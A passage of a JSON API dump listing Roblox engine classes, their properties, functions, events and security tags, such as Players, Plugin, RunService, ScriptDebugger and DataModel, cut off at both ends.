:[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceInfoAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetFriendsAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetNameFromUserIdAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"userName","Default":null}],"Name":"GetUserIdFromNameAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"ThumbnailType","Name":"thumbnailType","Default":null},{"Type":"ThumbnailSize","Name":"thumbnailSize","Default":null}],"Name":"GetUserThumbnailAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"player","Type":"Instance"},{"Name":"friendRequestEvent","Type":"FriendRequestEvent"}],"Name":"FriendRequestEvent","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"}],"Name":"GameAnnounce","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"chatType","Type":"PlayerChatType"},{"Name":"player","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"targetPlayer","Type":"Instance"}],"Name":"PlayerChatted","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerConnecting","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerDisconnecting","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRejoining","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoving","tags":[],"Class":"Players","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Plugin","tags":[]},{"ValueType":"bool","type":"Property","Name":"CollisionEnabled","tags":["readonly"],"Class":"Plugin"},{"ValueType":"float","type":"Property","Name":"GridSize","tags":["readonly"],"Class":"Plugin"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusiveMouse","Default":null}],"Name":"Activate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateToolbar","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"JointCreationMode","Arguments":[],"Name":"GetJoinMode","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"RibbonTool","Arguments":[],"Name":"GetSelectedRibbonTool","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetStudioUserId","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"rigModel","Default":null}],"Name":"ImportFbxAnimation","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Negate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"script","Default":null},{"Type":"int","Name":"lineNumber","Default":"1"}],"Name":"OpenScript","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenWikiPage","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveSelectedToRoblox","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"RibbonTool","Name":"tool","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SelectRibbonTool","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Separate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Union","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"ImportFbxRig","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"assetType","Default":null}],"Name":"PromptForExistingAssetId","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"suggestedFileName","Default":""}],"Name":"PromptSaveSelection","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"Arguments":[],"Name":"Deactivation","tags":["PluginSecurity"],"Class":"Plugin","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PluginManager","tags":[]},{"ReturnType":"Instance","Arguments":[],"Name":"CreatePlugin","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"EndUntranslatedStringCollect","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportPlace","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportSelection","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartUntranslatedStringCollect","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PointsService","tags":["notCreatable"]},{"ReturnType":"int","Arguments":[],"Name":"GetAwardablePoints","tags":["deprecated"],"Class":"PointsService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"amount","Default":null}],"Name":"AwardPoints","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGamePointBalance","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPointBalance","tags":["deprecated"],"Class":"PointsService","type":"YieldFunction"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"pointsAwarded","Type":"int"},{"Name":"userBalanceInGame","Type":"int"},{"Name":"userTotalBalance","Type":"int"}],"Name":"PointsAwarded","tags":[],"Class":"PointsService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Pose","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"MaskWeight","tags":["deprecated"],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"Weight","tags":[],"Class":"Pose"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddSubPose","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetSubPoses","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemoveSubPose","tags":[],"Class":"Pose","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PostEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"PostEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BloomEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"BloomEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BlurEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BlurEffect"},{"Superclass":"PostEffect","type":"Class","Name":"ColorCorrectionEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Contrast","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Saturation","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"Color3","type":"Property","Name":"TintColor","tags":[],"Class":"ColorCorrectionEffect"},{"Superclass":"PostEffect","type":"Class","Name":"SunRaysEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"SunRaysEffect"},{"ValueType":"float","type":"Property","Name":"Spread","tags":[],"Class":"SunRaysEffect"},{"Superclass":"Instance","type":"Class","Name":"RayValue","tags":[]},{"ValueType":"Ray","type":"Property","Name":"Value","tags":[],"Class":"RayValue"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"Changed","tags":[],"Class":"RayValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"changed","tags":["deprecated"],"Class":"RayValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadata","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataCallbacks","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataClasses","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEnums","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEvents","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataItem","tags":[]},{"ValueType":"bool","type":"Property","Name":"Browsable","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"ClassCategory","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"Deprecated","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"EditingDisabled","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"IsBackend","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMaximum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMinimum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UINumTicks","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"summary","tags":[],"Class":"ReflectionMetadataItem"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataClass","tags":[]},{"ValueType":"int","type":"Property","Name":"ExplorerImageIndex","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"int","type":"Property","Name":"ExplorerOrder","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"bool","type":"Property","Name":"Insertable","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"string","type":"Property","Name":"PreferredParent","tags":[],"Class":"ReflectionMetadataClass"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnum","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnumItem","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataMember","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataProperties","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataYieldFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"RemoteEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireAllClients","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireClient","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireServer","tags":[],"Class":"RemoteEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RemoteFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeClient","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeServer","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"ReturnType":"Tuple","Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"RenderSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"AutoFRMLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EagerBulkExecution","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"EditQualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EnableFRM","tags":["hidden"],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ExportMergeByMaterial","tags":[],"Class":"RenderSettings"},{"ValueType":"FramerateManagerMode","type":"Property","Name":"FrameRateManager","tags":[],"Class":"RenderSettings"},{"ValueType":"GraphicsMode","type":"Property","Name":"GraphicsMode","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"MeshCacheSize","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"QualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ReloadAssets","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"RenderCSGTrianglesDebug","tags":[],"Class":"RenderSettings"},{"ValueType":"Resolution","type":"Property","Name":"Resolution","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowBoundingBoxes","tags":[],"Class":"RenderSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxQualityLevel","tags":[],"Class":"RenderSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedFirst","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[],"Name":"IsDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveDefaultLoadingScreen","tags":[],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"Arguments":[],"Name":"DefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"FinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"RemoveDefaultLoadingGuiSignal","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"RobloxReplicatedStorage","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"RunService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"int","Name":"priority","Default":null},{"Type":"Function","Name":"function","Default":null}],"Name":"BindToRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetRobloxVersion","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsClient","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunMode","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunning","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsServer","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsStudio","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":["PluginSecurity","deprecated"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"Set3dRenderingEnabled","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"UnbindFromRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"setThrottleFramerateEnabled","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"Heartbeat","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"RenderStepped","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"},{"Name":"step","Type":"double"}],"Name":"Stepped","tags":[],"Class":"RunService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RuntimeScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ScriptContext","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"ScriptsDisabled","tags":["LocalUserSecurity"],"Class":"ScriptContext"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"parent","Default":null}],"Name":"AddCoreScriptLocal","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetTimeout","tags":["PluginSecurity"],"Class":"ScriptContext","type":"Function"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"stackTrace","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"Error","tags":[],"Class":"ScriptContext","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptDebugger","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"CurrentLine","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsDebugging","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"Object","type":"Property","Name":"Script","tags":["readonly"],"Class":"ScriptDebugger"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"expression","Default":null}],"Name":"AddWatch","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetBreakpoints","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[],"Name":"GetGlobals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetLocals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStack","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetUpvalues","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"Instance","Name":"watch","Default":null}],"Name":"GetWatchValue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetWatches","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"line","Default":null}],"Name":"SetBreakpoint","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetGlobal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetLocal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetUpvalue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"line","Type":"int"}],"Name":"EncounteredBreak","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[],"Name":"Resuming","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Selection","tags":[]},{"ReturnType":"Objects","Arguments":[],"Name":"Get","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"selection","Default":null}],"Name":"Set","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"Arguments":[],"Name":"SelectionChanged","tags":[],"Class":"Selection","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ServerScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServerStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServiceProvider","tags":["notbrowsable"]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"GetService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"getService","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"service","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"Arguments":[],"Name":"Close","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[],"Name":"CloseLate","tags":["LocalUserSecurity"],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceAdded","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceRemoving","tags":[],"Class":"ServiceProvider","type":"Event"},{"Superclass":"ServiceProvider","type":"Class","Name":"DataModel","tags":[]},{"ValueType":"int","type":"Property","Name":"CreatorId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"CreatorType","type":"Property","Name":"CreatorType","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"GameId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"GearGenreSetting","type":"Property","Name":"GearGenreSetting","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Genre","type":"Property","Name":"Genre","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"IsSFFlagsLoaded","tags":["RobloxScriptSecurity","readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"JobId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int64","type":"Property","Name":"PlaceId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceVersion","tags":["readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"VIPServerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"VIPServerOwnerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"Workspace","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"lighting","tags":["deprecated","readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"workspace","tags":["deprecated","readonly"],"Class":"DataModel"},{"ReturnType":"void","Arguments":[{"Type":"Function","Name":"function","Default":null}],"Name":"BindToClose","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobIntervalPeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobTimePeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsExtendedStats","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsInfo","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetMessage","tags":["deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetRemoteBuildMode","tags":["deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"HttpRequestType","Name":"httpRequestType","Default":"Default"},{"Type":"bool","Name":"doNotAllowDiabolicalMode","Default":"false"}],"Name":"HttpGet","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"string","Name":"contentType","Default":"*/*"},{"Type":"HttpRequestType","Name":"httpRequestType","Default":"Default"},{"Type":"bool","Name":"doNotAllowDiabolicalMode","Default":"false"}],"Name":"HttpPost","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"GearType","Name":"gearType","Default":null}],"Name":"IsGearTypeAllowed","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsLoaded","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Load","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"OpenScreenshotsFolder","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"OpenVideosFolder","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":"custom"},{"Type":"string","Name":"label","Default":"none"},{"Type":"int","Name":"value","Default":"0"}],"Name":"ReportInGoogleAnalytics","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"S